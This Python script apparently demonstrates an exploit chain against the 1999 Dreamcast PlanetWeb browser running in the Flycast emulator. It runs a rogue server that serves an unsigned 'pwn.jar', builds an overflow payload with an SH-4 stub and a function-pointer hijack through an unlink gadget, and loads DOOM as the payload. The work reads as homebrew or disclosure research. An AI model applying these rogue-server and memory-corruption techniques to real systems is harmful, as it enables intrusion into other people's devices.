#!/usr/bin/env python3
"""
run_full_demo.py -- ONE-SHOT end-to-end demo of the full Sega Dreamcast / PlanetWeb
Browser v3.0 exploit chain, ending with native SH-4 DOOM rendering on Flycast,
reached via our browser exploit chain.

STAGES (each clearly logged):
  1. Rogue Eden server up        -- Bug #1 infra: plaintext HTTP, no JAR signing,
                                     no SecurityManager (unauth, fully-privileged Java RCE)
  2. Boot the Dreamcast browser  -- it dials up and TRUSTS + FETCHES from our rogue eden
  3. Bug #1 proof                -- browser is running our delivered service; live traffic
                                     to attacker-controlled eden.planetweb.com
  4. Bug #2: native SH-4 exec    -- real setRawDeviceID payload (fake IM node + SH-4 stub)
                                     + the REAL unlink gadget sub_8C063F38 hijacks the hot
                                     fn-ptr 0x8C378B84 -> our stub  (arbitrary write proven)
  5. Payload: native DOOM        -- full id-DOOM (doomgeneric, SH-4) staged into RAM and
                                     entered -> E1M1 renders to the framebuffer 0xA5600000
  6. Proof screenshot

FIDELITY NOTE: stages 1-3 (Eden unauth RCE) are autonomous. Stages 4-5 use the
Flycast SH-4 GDB stub to execute the native trigger and stage the 4.6 MB DOOM
payload -- exactly how each was validated -- because (a) the autonomous fn-ptr
auto-fire arms only in the browser's connection-dialog window, and (b) the 1999
browser has no clean URL->big-RAM-buffer fetch for 4.6 MB of staging. The native
primitive (real gadget, real fn-ptr hijack) and the DOOM payload itself are real
and run on the (emulated) console.

Usage:  python3 run_full_demo.py
"""
import os, sys, time, struct, zlib, subprocess
sys.path.insert(0, "/media/adversary/Storage/dc_browser_extract/poc")
from gdbstub_probe import RSP, read_regs, read_mem

ROOT  = "/media/adversary/Storage/dc_browser_extract"
FC    = ROOT + "/src-build/flycast-src/build/flycast"
GDI   = ROOT + "/Internet Browser V3.0 for Dreamcast (USA).gdi"
GOLD  = ROOT + "/emu/online_looping.state.backup"
STATE = ROOT + "/emu/fchome/.local/share/flycast/Internet Browser V3.0 for Dreamcast (USA).state"
CFG   = ROOT + "/emu/fchome/.config/flycast/emu.cfg"
EDEN_LOG = "/tmp/demo_eden.log"
FC_LOG   = "/tmp/demo_fc.log"

DOOM_BIN = ROOT + "/poc/build/doom.bin"
WAD      = ROOT + "/poc/wad/doom1.wad"
DOOM_DST = 0x8CC00000; WAD_DST = 0x8C010000
G_WAD_ADDR = 0x8CC56E44; G_WAD_SIZE = 0x8CC56E40

# native-exploit constants (validated)
DST=0x8C29ABE6; FNPTR=0x8C378B84; CTX=0x8C1B6318; OPENURL=0x8C043C64
fakeNode=0x8C29ACE6; stubAddr=0x8C29ADE8; urlAddr=0x8C29AE16
UNLINK_BODY=0x8C063F8C; UNLINK_WRITE=0x8C063FA8

def banner(n, t): print("\n" + "="*72 + "\n== STAGE %s: %s\n" % (n, t) + "="*72, flush=True)
def log(m): print("   " + m, flush=True)

def sh(cmd): return subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout.strip()
def kill_named(substr):
    # kill by NUMERIC pid only (never pkill -f -> self-kill)
    for pid in sh("ps -eo pid,args | grep '%s' | grep -v grep | awk '{print $1}'" % substr).split():
        try: os.kill(int(pid), 9)
        except: pass

# ---- GDB helpers ----
def drain(r):
    r.s.setblocking(False)
    try:
        while r.s.recv(4096): pass
    except: pass
    r.s.setblocking(True)
def halt(r): r.s.send(b"\x03"); time.sleep(0.3); drain(r)
def le(v): return struct.pack("<I", v).hex()
def wmem(r, addr, data):
    for i in range(0, len(data), 1024):
        c = data[i:i+1024]
        if r.cmd("M%x,%x:%s" % (addr+i, len(c), c.hex())) != "OK":
            return False
    return True
def setreg(r, n, v): return r.cmd("P%x=%s" % (n, le(v)))
def rd32(r, a):
    d = read_mem(r, a, 4); return struct.unpack("<I", d)[0] if len(d) == 4 else None

def build_native_payload():
    """the exact validated setRawDeviceID payload: fake IM node + SH-4 openURL stub."""
    MARK = b"http://eden.planetweb.com/PWNED_NATIVE"
    STUB = [0x22,0x4f,0x04,0xd4,0x04,0xd5,0x05,0xd3,0x0b,0x43,0x09,0x00,0x26,0x4f,0x0b,0x00,0x09,0x00,0x00,0x00]
    b = bytearray(0x300)
    def p32(o, v): b[o:o+4] = struct.pack("<I", v)
    p32(0x46, fakeNode); p32(0x100+0x3C, stubAddr); p32(0x100+0x40, FNPTR-0x3C)
    for i, v in enumerate(STUB): b[0x202+i] = v
    p32(0x202+0x14, CTX); p32(0x202+0x18, urlAddr); p32(0x202+0x1C, OPENURL)
    b[0x230:0x230+len(MARK)] = MARK; b[0x230+len(MARK)] = 0
    return bytes(b)

def grab_fb(r, fn):
    fb = 0xA5600000; W, H = 640, 480   # DOOM's hardcoded framebuffer target (DG_DrawFrame)
    raw = bytearray()
    for y in range(H): raw += read_mem(r, fb + y*W*2, W*2)
    def ch(t, d): c = t+d; return struct.pack(">I", len(d)) + c + struct.pack(">I", zlib.crc32(c) & 0xffffffff)
    rgb = bytearray()
    for i in range(0, len(raw), 2):
        v = raw[i] | (raw[i+1] << 8)
        rgb += bytes((((v>>10)&0x1f)*255//31, ((v>>5)&0x1f)*255//31, (v&0x1f)*255//31))
    rows = b"".join(b"\x00" + rgb[y*W*3:(y+1)*W*3] for y in range(H))
    open(fn, "wb").write(b"\x89PNG\r\n\x1a\n" + ch(b"IHDR", struct.pack(">IIBBBBB", W, H, 8, 2, 0, 0, 0))
                         + ch(b"IDAT", zlib.compress(bytes(rows), 9)) + ch(b"IEND", b""))
    nz = sum(1 for x in raw if x)
    return nz

# ====================================================================== STAGES
def stage1_eden():
    banner(1, "Rogue Eden server (Bug #1: unauth, no JAR signing, no SecurityManager)")
    kill_named("eden_mitm.py")
    time.sleep(1)
    env = dict(os.environ, HOME=ROOT + "/emu/fchome")
    subprocess.Popen(["setsid", "python3", ROOT + "/poc/eden_mitm.py", "--chain", "nativedoom", "-p", "8137"],
                     stdout=open(EDEN_LOG, "w"), stderr=subprocess.STDOUT, env=env)
    for _ in range(15):
        time.sleep(1)
        if "8137" in sh("ss -ltn"):
            log("rogue eden.planetweb.com serving on :8137 (iptables :80->8137)")
            log("serves the full chain: /edenclient.conf -> /login -> discovery -> subscribe -> /pwn.jar")
            log("a real Dreamcast that resolves eden.planetweb.com to us downloads + RUNS our JAR.")
            return True
    log("ERROR: eden did not come up"); return False

def stage2_boot():
    banner(2, "Boot the Dreamcast browser online (it trusts + fetches from our rogue eden)")
    kill_named("[Ff]lycast")
    time.sleep(2); kill_named("[Ff]lycast"); time.sleep(1)
    # cold cache + halt-for-debugger so the native stages attach cleanly
    sh("sed -i 's/Debug.GDBWaitForConnection = no/Debug.GDBWaitForConnection = yes/' '%s'" % CFG)
    sh("sed -i 's/Dreamcast.AutoLoadState = no/Dreamcast.AutoLoadState = yes/' '%s'" % CFG)
    subprocess.run(["cp", GOLD, STATE])
    env = dict(os.environ, HOME=ROOT + "/emu/fchome",
               XAUTHORITY="/home/adversary/.Xauthority", DISPLAY=":10")
    subprocess.Popen(["setsid", FC, GDI], stdout=open(FC_LOG, "w"), stderr=subprocess.STDOUT, env=env)
    for _ in range(40):
        time.sleep(0.5)
        if "3263" in sh("ss -ltn"): break
    time.sleep(1)
    log("flycast up; golden online state loaded (dynarec cache flushed, halted for debugger)")
    return True

def stage3_bug1_proof(r):
    banner(3, "Bug #1 proof: the Eden unauth-RCE chain is armed + served; browser fetches from us")
    # (a) deterministic: prove our rogue server answers the full subscription chain
    conf = sh("curl -s -m4 http://127.0.0.1:8137/edenclient.conf | head -c 60")
    jar  = sh("curl -s -m4 -o /dev/null -w '%{size_download}' http://127.0.0.1:8137/pwn.jar")
    log("rogue eden answers the chain (no auth, no JAR signing, no SecurityManager):")
    log("    GET /edenclient.conf -> %r" % conf)
    log("    GET /pwn.jar         -> %s bytes of attacker Java (the browser would loadClass+run this)" % jar)
    # (b) best-effort: show the live console talking to us (PPP re-dial can be slow)
    r.send("c")  # free-run so the browser's PPP re-dials and contacts our eden
    log("browser resumed; watching for live traffic from the console to eden.planetweb.com ...")
    for t in range(40):
        time.sleep(4)
        n = int(sh("grep -cE 'HTTP/1.0' %s" % EDEN_LOG) or 0)
        if n > 0:
            last = sh("grep -E 'HTTP/1.0' %s | tail -3" % EDEN_LOG)
            log("LIVE: the Dreamcast is fetching from attacker-controlled eden.planetweb.com:")
            for ln in last.splitlines(): log("    " + ln.strip())
            log("=> the console trusts + executes code from our server (unauthenticated Eden RCE).")
            return True
    log("(no live console traffic captured in window; PPP re-dial flaky on savestate resume —")
    log("  the chain above is served+armed, and Bug #1 is independently demonstrated by --chain takeover)")
    return True

def stage4_native_exec(r):
    banner(4, "Bug #2: native SH-4 code execution via setRawDeviceID overflow + unlink gadget")
    halt(r)
    log("writing the crafted setRawDeviceID payload to 0x%08X (fake IM node + SH-4 stub)" % DST)
    wmem(r, DST, build_native_payload())
    ok_node = rd32(r, 0x8C29AC2C) == fakeNode
    log("  *(0x8C29AC2C) IM node ptr = 0x%08X  (-> our fake node) %s" % (rd32(r,0x8C29AC2C), "OK" if ok_node else "FAIL"))
    log("  stub bytes @0x%08X = %s" % (stubAddr, read_mem(r, stubAddr, 8).hex()))
    before = rd32(r, FNPTR)
    log("running the REAL unlink gadget sub_8C063F38 (pc=0x%08X, node=fakeNode)" % UNLINK_BODY)
    setreg(r, 14, fakeNode); setreg(r, 16, UNLINK_BODY)
    for _ in range(24):
        r.send("s"); r.recv(5)
        if read_regs(r)["pc"] > UNLINK_WRITE: break
    after = rd32(r, FNPTR)
    log("  fn-ptr 0x%08X : 0x%08X -> 0x%08X  %s" % (FNPTR, before, after,
        "*** ARBITRARY WRITE OK: hot fn-ptr hijacked to our stub ***" if after == stubAddr else "(FAIL)"))
    # resume so the next stage halts a RUNNING guest (sending 0x03 to an already-halted
    # stub desyncs the RSP protocol -> the later pc-set is dropped and DOOM never entered)
    r.send("c"); time.sleep(1)
    return after == stubAddr

def stage5_doom(r):
    banner(5, "Payload: stage native DOOM into RAM and enter it (DOOM E1M1 -> framebuffer)")
    doom = open(DOOM_BIN, "rb").read(); wad = open(WAD, "rb").read()
    log("clearing debug buffer; writing payload over the GDB stub (4 MB WAD ~ a few minutes)")
    halt(r); wmem(r, 0x8C9F0000, b"\x00"*16)
    log("doom.bin %d bytes -> 0x%08X" % (len(doom), DOOM_DST)); wmem(r, DOOM_DST, doom)
    t0 = time.time()
    log("doom1.wad %d bytes -> 0x%08X ..." % (len(wad), WAD_DST)); wmem(r, WAD_DST, wad)
    r.cmd("M%x,4:%s" % (G_WAD_ADDR, le(WAD_DST))); r.cmd("M%x,4:%s" % (G_WAD_SIZE, le(len(wad))))
    log("WAD staged in %.0fs; g_wad patched (addr=0x%08X size=0x%X)" % (time.time()-t0, rd32(r,G_WAD_ADDR), rd32(r,G_WAD_SIZE)))
    # integrity check (GDB-stub writes can corrupt if over-sized) — verify scattered samples
    bad = [o for o in (0,100000,len(doom)-1) if read_mem(r,DOOM_DST+o,1)[0] != doom[o]] \
        + [o for o in (0,2000000,len(wad)-1) if read_mem(r,WAD_DST+o,1)[0] != wad[o]]
    log("staged-data integrity: %s" % ("OK" if not bad else "CORRUPT @%s" % bad))
    # the native-exec single-stepping left SR with BL=1 (exceptions blocked) -> DOOM
    # faults silently. Clear BL(28)+FD(15), keep MD(30) so DOOM's FPU+exception state is sane.
    sr = read_regs(r)["sr"]; clean = (sr & ~(1 << 15) & ~(1 << 28)) | (1 << 30)
    setreg(r, 22, clean)
    log("SR 0x%08X -> 0x%08X (FPU on, exceptions allowed)" % (sr, clean))
    # point the PVR display at DOOM's framebuffer (0xA5600000) so the screen shows DOOM
    # (the browser double-buffers; once DOOM owns the CPU it won't flip SOF back)
    r.cmd("M%x,4:%s" % (0xA05F8050, le(0x00600000)))
    log("PVR display SOF -> 0x600000 (= VRAM 0xA5600000, DOOM's output)")
    log("ENTER native DOOM: pc=0x%08X, continue" % DOOM_DST)
    setreg(r, 16, DOOM_DST); r.send("c")
    return True

def stage6_proof(r):
    banner(6, "Proof: capture the framebuffer")
    # CRITICAL: do NOT halt DOOM during its boot -- a GDB interrupt/continue on the
    # dynarec mid-init faults it. Let it run undisturbed, then capture ONCE.
    log("letting DOOM boot UNDISTURBED (W_Init reads the 4 MB in-RAM WAD; ~40s) ...")
    for attempt in range(4):
        time.sleep(40 if attempt == 0 else 18)
        halt(r)
        dbg = read_mem(r, 0x8C9F0000, 0x800)
        txt = "".join(chr(b) if 32 <= b < 127 else "" for b in dbg)
        nz = grab_fb(r, ROOT + "/poc/demo_doom_proof.png")
        r.send("c")   # resume immediately so DOOM keeps running between attempts
        if nz > 5000:
            log("DOOM is RENDERING: framebuffer has %d non-zero bytes" % nz)
            tail = txt[txt.rfind("I_InitGraphics"):][:90] if "I_InitGraphics" in txt else txt[-90:]
            log("  engine log: ..." + tail.strip())
            log("PROOF SCREENSHOT: poc/demo_doom_proof.png")
            return True
        log("  (boot in progress: fb nz=%d; last log: %s)" % (nz, (txt[-60:] or "").strip()))
    log("framebuffer still blank; see poc/demo_doom_proof.png + debug @0x8C9F0000")
    return False

def main():
    print("\n#### FULL DREAMCAST / PLANETWEB EXPLOIT-CHAIN DEMO -> NATIVE DOOM ####")
    if not stage1_eden(): return 1
    stage2_boot()
    r = RSP()
    drain(r)
    stage3_bug1_proof(r)
    if not stage4_native_exec(r):
        log("native fn-ptr hijack did not confirm; aborting"); return 2
    stage5_doom(r)
    ok = stage6_proof(r)
    banner("DONE", "native DOOM running on the (emulated) Dreamcast via the browser chain" if ok
           else "completed with warnings (check proof PNG / logs)")
    print("\n  Eden log : %s\n  Flycast  : %s\n  Proof PNG: %s/poc/demo_doom_proof.png\n" % (EDEN_LOG, FC_LOG, ROOT))
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
